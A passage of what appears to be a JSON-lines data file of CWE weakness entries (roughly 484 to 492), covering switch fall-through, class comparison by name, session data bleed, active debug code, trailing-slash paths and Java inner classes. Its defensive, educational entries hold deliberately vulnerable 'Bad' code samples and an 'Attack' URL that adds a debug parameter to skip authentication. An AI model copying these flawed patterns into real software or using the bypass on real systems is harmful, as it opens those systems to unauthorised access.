{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Omitting a break statement so that one may fall through is often indistinguishable from an error, and therefore should be avoided. If you need to use fall-through capabilities, make sure that you have clearly documented this within the switch statement, and ensure that you have examined all the logical possibilities."}, {"Phase": ["Implementation"], "Description": "The functionality of omitting a break statement could be clarified with an if statement. This method is much safer."}], "DemonstrativeExamples": [{"ID": "DX-182", "Entries": [{"IntroText": "In both of these examples, a message is printed based on the month passed into the function:"}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic void printMessage(int month){\n\t\t\tswitch (month) {\n\t\t\t\t\tcase 1: print(\"January\");\n\t\t\t\t\tcase 2: print(\"February\");\n\t\t\t\t\tcase 3: print(\"March\");\n\t\t\t\t\tcase 4: print(\"April\");\n\t\t\t\t\tcase 5: print(\"May\");\n\t\t\t\t\tcase 6: print(\"June\");\n\t\t\t\t\tcase 7: print(\"July\");\n\t\t\t\t\tcase 8: print(\"August\");\n\t\t\t\t\tcase 9: print(\"September\");\n\t\t\t\t\tcase 10: print(\"October\");\n\t\t\t\t\tcase 11: print(\"November\");\n\t\t\t\t\tcase 12: print(\"December\");\n\t\t\t}\n\t\t\tprintln(\" is a great month\");\n\t}\n```"}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\tvoid printMessage(int month){\n\t\t\tswitch (month) {\n\t\t\t\t\tcase 1: printf(\"January\");\n\t\t\t\t\tcase 2: printf(\"February\");\n\t\t\t\t\tcase 3: printf(\"March\");\n\t\t\t\t\tcase 4: printf(\"April\");\n\t\t\t\t\tcase 5: printff(\"May\");\n\t\t\t\t\tcase 6: printf(\"June\");\n\t\t\t\t\tcase 7: printf(\"July\");\n\t\t\t\t\tcase 8: printf(\"August\");\n\t\t\t\t\tcase 9: printf(\"September\");\n\t\t\t\t\tcase 10: printf(\"October\");\n\t\t\t\t\tcase 11: printf(\"November\");\n\t\t\t\t\tcase 12: printf(\"December\");\n\t\t\t}\n\t\t\tprintf(\" is a great month\");\n\t}\n```"}, {"BodyText": "Both examples do not use a break statement after each case, which leads to unintended fall-through behavior. For example, calling \"printMessage(10)\" will result in the text \"OctoberNovemberDecember is a great month\" being printed."}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "486", "Name": "Comparison of Classes by Name", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "The product compares classes by name, which can cause it to use the wrong class when multiple classes can have the same name.", "ExtendedDescription": "If the decision to trust the methods and data of an object is based on the name of a class, it is possible for malicious users to send objects of the same name as trusted classes and thereby gain the trust afforded to known classes and types.", "LikelihoodOfExploit": "High", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1025", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Integrity", "Confidentiality", "Availability"], "Impact": ["Execute Unauthorized Code or Commands"], "Note": "If a product relies solely on the name of an object to determine identity, it may execute the incorrect or unintended code."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Use class equivalency to determine type. Rather than use the class name to determine if an object is of a given type, use the getClass() method, and == operator."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "In this example, the expression in the if statement compares the class of the inputClass object to a trusted class by comparing the class names."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tif (inputClass.getClass().getName().equals(\"TrustedClassName\")) {\n```\n// Do something assuming you trust inputClass* \n\t\t\t\n\t\t\t\n\t\t\t *// ...* \n\t\t\t}"}, {"BodyText": "However, multiple classes can have the same name therefore comparing an object's class by name can allow untrusted classes of the same name as the trusted class to be use to execute unintended or incorrect code. To compare the class of an object to the intended class the getClass() method and the comparison operator \"==\" should be used to ensure the correct trusted class is used, as shown in the following example."}, {"Nature": "Good", "Language": "Java", "ExampleCode": "```\n\tif (inputClass.getClass() == TrustedClass.class) {\n```\n// Do something assuming you trust inputClass* \n\t\t\t\n\t\t\t\n\t\t\t *// ...* \n\t\t\t}"}]}, {"Entries": [{"IntroText": "In this example, the Java class, TrustedClass, overrides the equals method of the parent class Object to determine equivalence of objects of the class. The overridden equals method first determines if the object, obj, is the same class as the TrustedClass object and then compares the object's fields to determine if the objects are equivalent."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic class TrustedClass {\n\t\t\t...\n\t\t\t@Override\n\t\t\tpublic boolean equals(Object obj) {\n\t\t\t\t\tboolean isEquals = false;\n```\n// first check to see if the object is of the same class* \n\t\t\t\t\tif (obj.getClass().getName().equals(this.getClass().getName())) {\n\t\t\t\t\t```\n```\n// then compare object fields* \n\t\t\t\t\t\t\t...\n\t\t\t\t\t\t\tif (...) {\n\t\t\t\t\t\t\t```\n\t\t\t\t\t\t\t\tisEquals = true;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\treturn isEquals;\n\t\t\t}\n\t\t\t...\n\t}\n```"}, {"BodyText": "However, the equals method compares the class names of the object, obj, and the TrustedClass object to determine if they are the same class. As with the previous example using the name of the class to compare the class of objects can lead to the execution of unintended or incorrect code if the object passed to the equals method is of another class with the same name. To compare the class of an object to the intended class, the getClass() method and the comparison operator \"==\" should be used to ensure the correct trusted class is used, as shown in the following example."}, {"Nature": "Good", "Language": "Java", "ExampleCode": "```\n\tpublic boolean equals(Object obj) {\n\t\t\t...\n```\n// first check to see if the object is of the same class* \n\t\t\tif (obj.getClass() == this.getClass()) {\n\t\t\t```\n\t\t\t\t...\n\t\t\t}\n\t\t\t...\n\t}\n```"}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "487", "Name": "Reliance on Package-level Scope", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "Java packages are not inherently closed; therefore, relying on them for code security is not a good practice.", "ExtendedDescription": "The purpose of package scope is to prevent accidental access by other parts of a program. This is an ease-of-software-development feature but not a security feature.", "LikelihoodOfExploit": "Medium", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "664", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data"], "Note": "Any data in a Java package can be accessed outside of the Java framework if the package is distributed."}, {"Scope": ["Integrity"], "Impact": ["Modify Application Data"], "Note": "The data in a Java class can be modified by anyone outside of the Java framework if the packages is distributed."}], "PotentialMitigations": [{"Phase": ["Architecture and Design", "Implementation"], "Description": "Data should be private static and final whenever possible. This will assure that your code is protected by instantiating early, preventing access and tampering."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "The following example demonstrates the weakness."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpackage math;\n\tpublic class Lebesgue implements Integration{\n\t\t\tpublic final Static String youAreHidingThisFunction(functionToIntegrate){\n\t\t\t\t\treturn ...;\n\t\t\t}\n\t}\n```"}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "488", "Name": "Exposure of Data Element to Wrong Session", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The product does not sufficiently enforce boundaries between the states of different sessions, causing data to be provided to, or used by, the wrong session.", "ExtendedDescription": "\n\nData can \"bleed\" from one session to another through member variables of singleton objects, such as Servlets, and objects from a shared pool.\n\n\nIn the case of Servlets, developers sometimes do not understand that, unless a Servlet implements the SingleThreadModel interface, the Servlet is a singleton; there is only one instance of the Servlet, and that single instance is used and re-used to handle multiple requests that are processed simultaneously by different threads. A common result is that developers use Servlet member fields in such a way that one user may inadvertently see another user's data. In other words, storing user data in Servlet member fields introduces a data access race condition.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "668", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation", "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data"]}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Architecture and Design"], "Description": "Protect the application's sessions from information leakage. Make sure that a session's data is not used or visible by other sessions."}, {"Phase": ["Testing"], "Description": "Use a static analysis tool to scan the code for information leakage vulnerabilities (e.g. Singleton Member Field)."}, {"Phase": ["Architecture and Design"], "Description": "In a multithreading environment, storing user data in Servlet member fields introduces a data access race condition. Do not use member fields to store information in the Servlet."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "The following Servlet stores the value of a request parameter in a member field and then later echoes the parameter value to the response output stream."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic class GuestBook extends HttpServlet {\n\t\t\tString name;\n\t\t\tprotected void doPost (HttpServletRequest req, HttpServletResponse res) {\n\t\t\t\tname = req.getParameter(\"name\");\n\t\t\t\t...\n\t\t\t\tout.println(name + \", thanks for visiting!\");\n\t\t\t}\n\t}\n```"}, {"BodyText": "While this code will work perfectly in a single-user environment, if two users access the Servlet at approximately the same time, it is possible for the two request handler threads to interleave in the following way: Thread 1: assign \"Dick\" to name Thread 2: assign \"Jane\" to name Thread 1: print \"Jane, thanks for visiting!\" Thread 2: print \"Jane, thanks for visiting!\" Thereby showing the first user the second user's name."}]}], "RelatedAttackPatterns": ["59", "60"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2022-23505", "Description": "Passport-wsfed-saml2 is a ws-federation protocol and SAML2 tokens authentication provider for Passport. In versions prior to 4.6.3, a remote attacker may be able to bypass WSFed authentication on a website using passport-wsfed-saml2. A successful attack requires that the attacker is in possession of an arbitrary IDP signed assertion. Depending on the IDP used, fully unauthenticated attacks (e.g without access to a valid user) might also be feasible if generation of a signed message can be triggered. This issue is patched in version 4.6.3. Use of SAML2 authentication instead of WSFed is a workaround."}]}
{"ID": "489", "Name": "Active Debug Code", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The product is deployed to unauthorized actors with debugging code still enabled or active, which can create unintended entry points or expose sensitive information.", "ExtendedDescription": "A common development practice is to add \"back door\" code specifically designed for debugging or testing purposes that is not intended to be shipped or deployed with the product. These back door entry points create security risks because they are not considered during design or testing and fall outside of the expected operating conditions of the product.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "710", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "CanPrecede", "CweID": "215", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}, {"Ordinality": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}, {"Type": "Technology", "Class": "Not Technology-Specific", "Prevalence": "Undetermined"}, {"Type": "Technology", "Class": "ICS/OT", "Prevalence": "Undetermined"}], "AlternateTerms": [{"Term": "Leftover debug code", "Description": "This term originates from Seven Pernicious Kingdoms"}], "ModesOfIntroduction": [{"Phase": "Implementation", "Note": "In web-based applications, debug code is used to test and modify web application properties, configuration information, and functions. If a debug application is left on a production server, this oversight during the \"software process\" allows attackers access to debug functionality."}, {"Phase": "Build and Compilation"}, {"Phase": "Operation"}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity", "Availability", "Access Control", "Other"], "Impact": ["Bypass Protection Mechanism", "Read Application Data", "Gain Privileges or Assume Identity", "Varies by Context"], "Note": "The severity of the exposed debug application will depend on the particular instance. At the least, it will give an attacker sensitive information about the settings and mechanics of web applications on the server. At worst, as is often the case, the debug application will allow an attacker complete control over the web application and server, as well as confidential information that either of these access."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Build and Compilation", "Distribution"], "Description": "Remove debug code before deploying the application."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "Debug code can be used to bypass authentication. For example, suppose an application has a login script that receives a username and a password. Assume also that a third, optional, parameter, called \"debug\", is interpreted by the script as requesting a switch to debug mode, and that when this parameter is given the username and password are not checked. In such a case, it is very simple to bypass the authentication process if the special behavior of the application regarding the debug parameter is known. In a case where the form is:"}, {"Nature": "Bad", "Language": "HTML", "ExampleCode": "```\n\t<FORM ACTION=\"/authenticate_login.cgi\">\n\t\t<INPUT TYPE=TEXT name=username>\n\t\t<INPUT TYPE=PASSWORD name=password>\n\t\t<INPUT TYPE=SUBMIT>\n\t</FORM>\n```"}, {"BodyText": "Then a conforming link will look like:"}, {"Nature": "Informative", "ExampleCode": "```\n\thttp://TARGET/authenticate_login.cgi?username=...&password=...\n```"}, {"BodyText": "An attacker can change this to:"}, {"Nature": "Attack", "ExampleCode": "```\n\thttp://TARGET/authenticate_login.cgi?username=&password=&debug=1\n```"}, {"BodyText": "Which will grant the attacker access to the site, bypassing the authentication process."}]}], "RelatedAttackPatterns": ["121", "661"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Other", "Note": "In J2EE a main method may be a good indicator that debug code has been left in the application, although there may not be any direct security impact."}], "Top25Examples": [{"Reference": "CVE-2022-20089", "Description": "In aee driver, there is a possible memory corruption due to active debug code. This could lead to local escalation of privilege with System execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS06240397; Issue ID: ALPS06240397."}, {"Reference": "CVE-2022-33323", "Description": "Active Debug Code vulnerability in robot controller of Mitsubishi Electric Corporation industrial robot MELFA SD/SQ Series and MELFA F-Series allows a remote unauthenticated attacker to gain unauthorized access by authentication bypass through an unauthorized telnet login. As for the affected model names, controller types and firmware versions, see the Mitsubishi Electric's advisory which is listed in [References] section."}, {"Reference": "CVE-2021-28112", "Description": "Draeger X-Dock Firmware before 03.00.13 has Active Debug Code on a debug port, leading to remote code execution by an authenticated attacker."}, {"Reference": "CVE-2022-36348", "Description": "Active debug code in some Intel (R) SPS firmware before version SPS_E5_04.04.04.300.0 may allow an authenticated user to potentially enable escalation of privilege via local access."}, {"Reference": "CVE-2022-24797", "Description": "Pomerium is an identity-aware access proxy. In distributed service mode, Pomerium's Authenticate service exposes pprof debug and prometheus metrics handlers to untrusted traffic. This can leak potentially sensitive environmental information or lead to limited denial of service conditions. This issue is patched in version v0.17.1 Workarounds: Block access to `/debug` and `/metrics` paths on the authenticate service. This can be done with any L7 proxy, including Pomerium's own proxy service."}]}
{"ID": "49", "Name": "Path Equivalence: 'filename/' (Trailing Slash)", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The product accepts path input in the form of trailing slash ('filedir/') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "41", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "162", "ViewID": "1000"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}, {"Phase": "Operation"}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity"], "Impact": ["Read Files or Directories", "Modify Files or Directories"]}], "ObservedExamples": [{"Reference": "CVE-2002-0253", "Description": "Overlaps infoleak", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-0253"}, {"Reference": "CVE-2001-0446", "Description": "Application server allows remote attackers to read source code for .jsp files by appending a / to the requested URL.", "Link": "https://www.cve.org/CVERecord?id=CVE-2001-0446"}, {"Reference": "CVE-2004-0334", "Description": "Bypass Basic Authentication for files using trailing \"/\"", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0334"}, {"Reference": "CVE-2001-0893", "Description": "Read sensitive files with trailing \"/\"", "Link": "https://www.cve.org/CVERecord?id=CVE-2001-0893"}, {"Reference": "CVE-2001-0892", "Description": "Web server allows remote attackers to view sensitive files under the document root (such as .htpasswd) via a GET request with a trailing /.", "Link": "https://www.cve.org/CVERecord?id=CVE-2001-0892"}, {"Reference": "CVE-2004-1814", "Description": "Directory traversal vulnerability in server allows remote attackers to read protected files via .. (dot dot) sequences in an HTTP request.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-1814"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "491", "Name": "Public cloneable() Method Without Final ('Object Hijack')", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "A class has a cloneable() method that is not declared final, which allows an object to be created without calling the constructor. This can cause the object to be in an unexpected state.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "668", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Integrity", "Other"], "Impact": ["Unexpected State", "Varies by Context"]}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Make the cloneable() method final."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "In this example, a public class \"BankAccount\" implements the cloneable() method which declares \"Object clone(string accountnumber)\":"}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic class BankAccount implements Cloneable{\n\t\t\tpublic Object clone(String accountnumber) throws\n\t\t\tCloneNotSupportedException\n\t\t\t{\n\t\t\t\t\tObject returnMe = new BankAccount(account number);\n\t\t\t\t\t...\n\t\t\t}\n\t}\n```"}]}, {"Entries": [{"IntroText": "In the example below, a clone() method is defined without being declared final."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tprotected Object clone() throws CloneNotSupportedException {\n\t\t...\n\t}\n```"}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "492", "Name": "Use of Inner Class Containing Sensitive Data", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "Inner classes are translated into classes that are accessible at package scope and may expose code that the programmer intended to keep private to attackers.", "ExtendedDescription": "Inner classes quietly introduce several security concerns because of the way they are translated into Java bytecode. In Java source code, it appears that an inner class can be declared to be accessible only by the enclosing class, but Java bytecode has no concept of an inner class, so the compiler must transform an inner class declaration into a peer class with package level access to the original outer class. More insidiously, since an inner class can access private fields in its enclosing class, once an inner class becomes a peer class in bytecode, the compiler converts private fields accessed by the inner class into protected fields.", "LikelihoodOfExploit": "Medium", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "668", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data"], "Note": "\"Inner Classes\" data confidentiality aspects can often be overcome."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Using sealed classes protects object-oriented encapsulation paradigms and therefore protects code from being extended in unforeseen ways."}, {"Phase": ["Implementation"], "Description": "Inner Classes do not provide security. Warning: Never reduce the security of the object from an outer class, going to an inner class. If an outer class is final or private, ensure that its inner class is private as well."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "The following Java Applet code mistakenly makes use of an inner class."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic final class urlTool extends Applet {\n\t\tprivate final class urlHelper {\n\t\t\t...\n\t\t}\n\t\t...\n\t}\n```"}]}, {"Entries": [{"IntroText": "The following example shows a basic use of inner classes. The class OuterClass contains the private member inner class InnerClass. The private inner class InnerClass includes the method concat that accesses the private member variables of the class OuterClass to output the value of one of the private member variables of the class OuterClass and returns a string that is a concatenation of one of the private member variables of the class OuterClass, the separator input parameter of the method and the private member variable of the class InnerClass."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic class OuterClass {\n```\n// private member variables of OuterClass* \n\t\tprivate String memberOne;\n\t\tprivate String memberTwo;\n\t\t\n\t\t\n\t\t *// constructor of OuterClass* \n\t\tpublic OuterClass(String varOne, String varTwo) {\n\t\t```\n\t\t\tthis.memberOne = varOne;\n\t\t\tthis.memberTwo = varTwo;\n\t\t}\n```\n// InnerClass is a member inner class of OuterClass* \n\t\tprivate class InnerClass {\n\t\t```\n\t\t\tprivate String innerMemberOne;\n\t\t\tpublic InnerClass(String innerVarOne) {\n\t\t\t\tthis.innerMemberOne = innerVarOne;\n\t\t\t}\n\t\t\tpublic String concat(String separator) {\n```\n// InnerClass has access to private member variables of OuterClass* \n\t\t\t\tSystem.out.println(\"Value of memberOne is: \" + memberOne);\n\t\t\t\treturn OuterClass.this.memberTwo + separator + this.innerMemberOne;}}}"}, {"BodyText": "Although this is an acceptable use of inner classes it demonstrates one of the weaknesses of inner classes that inner classes have complete access to all member variables and methods of the enclosing class even those that are declared private and protected. When inner classes are compiled and translated into Java bytecode the JVM treats the inner class as a peer class with package level access to the enclosing class."}, {"BodyText": "To avoid this weakness of inner classes, consider using either static inner classes, local inner classes, or anonymous inner classes."}, {"BodyText": "The following Java example demonstrates the use of static inner classes using the previous example. The inner class InnerClass is declared using the static modifier that signifies that InnerClass is a static member of the enclosing class OuterClass. By declaring an inner class as a static member of the enclosing class, the inner class can only access other static members and methods of the enclosing class and prevents the inner class from accessing nonstatic member variables and methods of the enclosing class. In this case the inner class InnerClass can only access the static member variable memberTwo of the enclosing class OuterClass but cannot access the nonstatic member variable memberOne."}, {"Nature": "Good", "Language": "Java", "ExampleCode": "```\n\tpublic class OuterClass {\n```\n// private member variables of OuterClass* \n\t\t\tprivate String memberOne;\n\t\t\tprivate static String memberTwo;\n\t\t\t\n\t\t\t\n\t\t\t *// constructor of OuterClass* \n\t\t\tpublic OuterClass(String varOne, String varTwo) {\n\t\t\t\n\t\t\t```\n\t\t\t\tthis.memberOne = varOne;\n\t\t\t\tthis.memberTwo = varTwo;\n\t\t\t}\n```\n// InnerClass is a static inner class of OuterClass* \n\t\t\tprivate static class InnerClass {\n\t\t\t```\n\t\t\t\t\tprivate String innerMemberOne;\n\t\t\t\t\tpublic InnerClass(String innerVarOne) {\n\t\t\t\t\t\tthis.innerMemberOne = innerVarOne;\n\t\t\t\t\t}\n\t\t\t\t\tpublic String concat(String separator) {\n```\n// InnerClass only has access to static member variables of OuterClass* \n\t\t\t\t\t\t\treturn memberTwo + separator + this.innerMemberOne;}}}"}, {"BodyText": "The only limitation with using a static inner class is that as a static member of the enclosing class the inner class does not have a reference to instances of the enclosing class. For many situations this may not be ideal. An alternative is to use a local inner class or an anonymous inner class as shown in the next examples."}]}, {"Entries": [{"IntroText": "In the following example the BankAccount class contains the private member inner class InterestAdder that adds interest to the bank account balance. The start method of the BankAccount class creates an object of the inner class InterestAdder, the InterestAdder inner class implements the ActionListener interface with the method actionPerformed. A Timer object created within the start method of the BankAccount class invokes the actionPerformed method of the InterestAdder class every 30 days to add the interest to the bank account balance based on the interest rate passed to the start method as an input parameter. The inner class InterestAdder needs access to the private member variable balance of the BankAccount class in order to add the interest to the bank account balance."}, {"BodyText": "However as demonstrated in the previous example, because InterestAdder is a non-static member inner class of the BankAccount class, InterestAdder also has access to the private member variables of the BankAccount class - including the sensitive data contained in the private member variables for the bank account owner's name, Social Security number, and the bank account number."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic class BankAccount {\n```\n// private member variables of BankAccount class* \n\t\t\tprivate String accountOwnerName;\n\t\t\tprivate String accountOwnerSSN;\n\t\t\tprivate int accountNumber;\n\t\t\tprivate double balance;\n\t\t\t\n\t\t\t\n\t\t\t *// constructor for BankAccount class* \n\t\t\tpublic BankAccount(String accountOwnerName, String accountOwnerSSN,\n\t\t\tint accountNumber, double initialBalance, int initialRate)\n\t\t\t{\n\t\t\t```\n\t\t\t\tthis.accountOwnerName = accountOwnerName;\n\t\t\t\tthis.accountOwnerSSN = accountOwnerSSN;\n\t\t\t\tthis.accountNumber = accountNumber;\n\t\t\t\tthis.balance = initialBalance;\n\t\t\t\tthis.start(initialRate);\n\t\t\t}\n```\n// start method will add interest to balance every 30 days* \n\t\t\t\n\t\t\t\n\t\t\t *// creates timer object and interest adding action listener object* \n\t\t\tpublic void start(double rate)\n\t\t\t{\n\t\t\t```\n\t\t\t\tActionListener adder = new InterestAdder(rate);\n\t\t\t\tTimer t = new Timer(1000 * 3600 * 24 * 30, adder);\n\t\t\t\tt.start();\n\t\t\t}\n```\n// InterestAdder is an inner class of BankAccount class* \n\t\t\t\n\t\t\t\n\t\t\t *// that implements the ActionListener interface* \n\t\t\tprivate class InterestAdder implements ActionListener\n\t\t\t{\n\t\t\t```\n\t\t\t\t\tprivate double rate;\n\t\t\t\t\tpublic InterestAdder(double aRate)\n\t\t\t\t\t{\n\t\t\t\t\t\tthis.rate = aRate;\n\t\t\t\t\t}\n\t\t\t\t\tpublic void actionPerformed(ActionEvent event)\n\t\t\t\t\t{\n```\n// update interest* \n\t\t\t\t\t\t\tdouble interest = BankAccount.this.balance * rate / 100;\n\t\t\t\t\t\t\tBankAccount.this.balance += interest;}\n\t\t\t\t\t}}"}, {"BodyText": "In the following example the InterestAdder class from the above example is declared locally within the start method of the BankAccount class. As a local inner class InterestAdder has its scope restricted to the method (or enclosing block) where it is declared, in this case only the start method has access to the inner class InterestAdder, no other classes including the enclosing class has knowledge of the inner class outside of the start method. This allows the inner class to access private member variables of the enclosing class but only within the scope of the enclosing method or block."}, {"Nature": "Good", "Language": "Java", "ExampleCode": "```\n\tpublic class BankAccount {\n```\n// private member variables of BankAccount class* \n\t\t\tprivate String accountOwnerName;\n\t\t\tprivate String accountOwnerSSN;\n\t\t\tprivate int accountNumber;\n\t\t\tprivate double 